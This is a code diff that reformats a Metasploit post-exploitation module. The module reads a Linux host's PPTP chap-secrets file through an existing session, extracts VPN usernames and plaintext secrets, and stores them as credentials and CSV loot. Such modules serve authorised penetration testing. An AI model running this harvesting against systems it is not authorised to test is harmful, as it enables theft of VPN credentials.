@@ -7,25 +7,28 @@ class MetasploitModule < Msf::Post
   include Msf::Post::File
   include Msf::Auxiliary::Report
 
-  def initialize(info={})
-    super( update_info( info,
-      'Name'          => 'Linux Gather PPTP VPN chap-secrets Credentials',
-      'Description'   => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather PPTP VPN chap-secrets Credentials',
+        'Description' => %q{
           This module collects PPTP VPN information such as client, server, password,
-        and IP from your target server's chap-secrets file.
-      },
-      'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
-      'Platform'      => [ 'linux' ],
-      'SessionTypes'  => [ "shell", "meterpreter" ]
-    ))
+          and IP from your target server's chap-secrets file.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [ 'sinn3r'],
+        'Platform' => [ 'linux' ],
+        'SessionTypes' => [ 'shell', 'meterpreter' ]
+      )
+    )
 
     register_options(
       [
         OptString.new('FILE', [true, 'The default path for chap-secrets', '/etc/ppp/chap-secrets'])
-      ])
+      ]
+    )
   end
-
 
   #
   # Reads chap_secrets
@@ -41,7 +44,6 @@ class MetasploitModule < Msf::Post
     return data
   end
 
-
   def report_cred(opts)
     service_data = {
       address: opts[:ip],
@@ -53,7 +55,7 @@ class MetasploitModule < Msf::Post
 
     credential_data = {
       module_fullname: fullname,
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -63,20 +65,19 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
   end
-
 
   #
   # Extracts client, server, secret, and IP addresses
   #
   def extract_secrets(data)
     tbl = Rex::Text::Table.new({
-      'Header'  => 'PPTPd chap-secrets',
-      'Indent'  => 1,
+      'Header' => 'PPTPd chap-secrets',
+      'Indent' => 1,
       'Columns' => ['Client', 'Server', 'Secret', 'IP']
     })
 
@@ -92,15 +93,14 @@ class MetasploitModule < Msf::Post
       client = (found[0] || '').strip
       server = (found[1] || '').strip
       secret = (found[2] || '').strip
-      ip     = (found[3,found.length] * ", " || '').strip
+      ip = (found[3, found.length] * ', ' || '').strip
 
       report_cred(
         ip: session.session_host,
         port: 1723, # PPTP port
         service_name: 'pptp',
         user: client,
-        password: secret,
-
+        password: secret
       )
 
       tbl << [client, server, secret, ip]
@@ -116,12 +116,11 @@ class MetasploitModule < Msf::Post
         'text/csv',
         session,
         tbl.to_csv,
-        File.basename(datastore['FILE'] + ".txt")
+        File.basename(datastore['FILE'] + '.txt')
       )
       print_good("Secrets stored in: #{p}")
     end
   end
-
 
   def run
     fname = datastore['FILE']
